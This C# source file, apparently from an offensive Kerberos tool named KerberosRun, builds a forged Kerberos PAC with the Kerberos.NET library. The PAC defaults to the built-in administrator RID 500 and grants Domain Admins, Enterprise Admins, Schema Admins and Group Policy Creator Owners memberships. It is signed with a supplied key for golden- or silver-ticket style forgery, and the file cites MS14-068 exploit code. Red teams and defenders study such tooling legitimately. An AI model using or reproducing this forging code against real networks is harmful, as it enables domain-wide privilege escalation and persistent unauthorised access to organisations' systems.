using Kerberos.NET;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using Kerberos.NET.Entities.Pac;
using Kerberos.NET.Ndr;
using NLog;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace KerberosRun
{
    class Pac
    {
        internal static Logger logger = LogManager.GetCurrentClassLogger();
        //KDC KRB_AP_ERR_MODIFIED: Message stream modified
        //During TGS processing, the KDC was unable to verify the signature on the PAC from krbtgt. This indicates the PAC was modified.

        //Kerberos PAC Validation
        //https://docs.microsoft.com/en-us/archive/blogs/openspecification/understanding-microsoft-kerberos-pac-validation
        public static KrbAuthorizationData[] generatePac(string username, string domainsid, string domainname, KerberosKey key, DateTime now,
            int userid = 500)
        {

            logger.Info("[*] Building PAC ...");

            //////////////Build PAC

            var forgedPac = new PrivilegedAttributeCertificate();

            ////////////////
            //https://github.com/SecWiki/windows-kernel-exploits/blob/5593d65dcb94696242687904b55f4e27ce33f235/MS14-068/pykek/kek/pac.py#L56
            //PAC_LOGON_INFO
            var logonInfo = new PacLogonInfo();
            // LogonTime
            logonInfo.LogonTime = RpcFileTime.Convert(now);
            // LogoffTime
            ///logonInfo.LogoffTime = RpcFileTime.Convert(DateTime.MinValue);
            // KickOffTime
            //logonInfo.KickOffTime = RpcFileTime.Convert(DateTime.MinValue);
            // PasswordLastSet
            //logonInfo.PwdLastChangeTime = RpcFileTime.Convert(DateTime.Now.AddDays(-22));
            // PasswordCanChange
            //logonInfo.PwdCanChangeTime = RpcFileTime.Convert(DateTime.Now.AddDays(-21));
            // PasswordMustChange
            //logonInfo.PwdMustChangeTime = RpcFileTime.Convert(DateTime.MinValue);
            // EffectiveName
            logonInfo.UserName = username;
            // FullName
            //logonInfo.UserDisplayName = null;
            // LogonScript
            //logonInfo.LogonScript = "";
            // ProfilePath
            //logonInfo.ProfilePath = "";
            // HomeDirectory
            //logonInfo.HomeDirectory = "";
            // HomeDirectoryDrive
            //logonInfo.HomeDrive = "";
            // LogonCount
            //logonInfo.LogonCount = 0;
            // BadPasswordCount
            //logonInfo.BadPasswordCount = 0;
            // UserId
            logonInfo.UserId = (uint)userid;
            // PrimaryGroupId
            logonInfo.GroupId = 513;
            // GroupCount
            // GroupIds[0]
            var se_group_all = SidAttributes.SE_GROUP_ENABLED |
                    SidAttributes.SE_GROUP_ENABLED_BY_DEFAULT |
                    SidAttributes.SE_GROUP_INTEGRITY |
                    SidAttributes.SE_GROUP_INTEGRITY_ENABLED |
                    SidAttributes.SE_GROUP_LOGON_ID |
                    SidAttributes.SE_GROUP_MANDATORY |
                    SidAttributes.SE_GROUP_OWNER |
                    SidAttributes.SE_GROUP_RESOURCE ;
                    //SidAttributes.SE_GROUP_USE_FOR_DENY_ONLY;
            IEnumerable<GroupMembership> groupIds = new GroupMembership[]
            {
                new GroupMembership()
                {
                    Attributes = se_group_all,
                    RelativeId = 513
                },
                new GroupMembership()
                {
                    Attributes = se_group_all,
                    RelativeId = 512
                },
                new GroupMembership()
                {
                    Attributes = se_group_all,
                    RelativeId = 520
                },
                new GroupMembership()
                {
                    Attributes = se_group_all,
                    RelativeId = 518
                },
                new GroupMembership()
                {
                    Attributes = se_group_all,
                    RelativeId = 519
                },
            };
            logonInfo.GroupIds = groupIds;
            // UserFlags
            logonInfo.UserFlags = UserFlags.LOGON_EXTRA_SIDS;
            // UserSessionKey
            string userSessKeyStr = "00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00";
            byte[] keyByte = Array.ConvertAll<string, byte>(userSessKeyStr.Split('-'), s => Convert.ToByte(s, 16));
            logonInfo.UserSessionKey = keyByte.ToArray().AsMemory();
            // LogonServer
            //logonInfo.ServerName = "";
            // LogonDomainName
            logonInfo.DomainName = domainname.ToUpper();//domainname.Split('.')[0].ToUpper();


            // LogonDomainId
            domainsid = domainsid.Replace("S-1-5-", string.Empty);
            var subCount = domainsid.Split('-').Length;

            uint[] subAuth = new uint[subCount];
            for (int i=0; i < subCount; i++ )
            {
                subAuth[i] = uint.Parse(domainsid.Split('-')[i]);
            }

            var identAuth = new byte[6];
            identAuth[5] = (int)IdentifierAuthority.NTAuthority;

            logonInfo.DomainId = new RpcSid()
            {
                IdentifierAuthority = new RpcSidIdentifierAuthority()
                {
                    IdentifierAuthority = identAuth
                },
                SubAuthority = subAuth.AsMemory(),
                SubAuthorityCount = (byte)subCount,
                Revision = 1
            };



            // Reserved1
            int[] reserved1 = { 0, 0 };
            logonInfo.Reserved1 = reserved1.ToArray().AsMemory();
            // UserAccountControl
            logonInfo.UserAccountControl = UserAccountControlFlags.ADS_UF_NORMAL_ACCOUNT |
                UserAccountControlFlags.ADS_UF_LOCKOUT;
            // SubAuthStatus
            logonInfo.SubAuthStatus = 0;
            // LastSuccessFulILogon
            logonInfo.LastSuccessfulILogon = RpcFileTime.Convert(new DateTime(1601, 1, 1, 12, 00, 00));
            // LastFailedILogon
            logonInfo.LastFailedILogon = RpcFileTime.Convert(new DateTime(1601, 1, 1, 12, 00, 00));
            // FailedILogonCount
            logonInfo.FailedILogonCount = 0;
            // Reserved3
            logonInfo.Reserved3 = 0;
            // SidCount
            // ExtraSids
            // ResourceGroupDomainSid
            // ResourceGroupCount
            // ResourceGroupIdss
            //logonInfo.ResourceGroupIds = null;// new GroupMembership[] { };
            // ExtraIds
            //RpcSidAttributes[] extraIds =
            //{
            //    new RpcSidAttributes()
            //    {
            //        Sid = new RpcSid()
            //        {
            //            IdentifierAuthority = new RpcSidIdentifierAuthority(){},
            //            Revision = 1,
            //            //SubAuthority = a.ToArray().AsMemory()
            //        },
            //        Attributes = se_group_all
            //    } 
            //};
            //logonInfo.ExtraIds = extraIds;
            //logonInfo.ResourceGroupIds = new GroupMembership[] { };

            forgedPac.LogonInfo = logonInfo;



            ////////////////
            //PAC_CLIENT_INFO
            var clientInformation = new PacClientInfo()
            {
                Name = username,
                ClientId = RpcFileTime.Convert(now),
            };


            forgedPac.ClientInformation = clientInformation;

             //From Book: Network Security Assessment Table 7-26
             //TGT: PAC (KDC)    -> krbtgt
             //     PAC (Server) -> krbtgt
            var authz = new List<KrbAuthorizationData>();


            var sequence = new KrbAuthorizationDataSequence
            {
                AuthorizationData = new[]
                {
                    new KrbAuthorizationData
                    {
                        Type = AuthorizationDataType.AdWin2kPac,
                        Data =  forgedPac.Encode(key, key)
                    }
                }
            };

            authz.Add(
                new KrbAuthorizationData
                {
                    Type = AuthorizationDataType.AdIfRelevant,
                    Data = sequence.Encode()
                });

            logger.Info("[+] PAC was built successfully!");
            return authz.ToArray();

        }





    }
}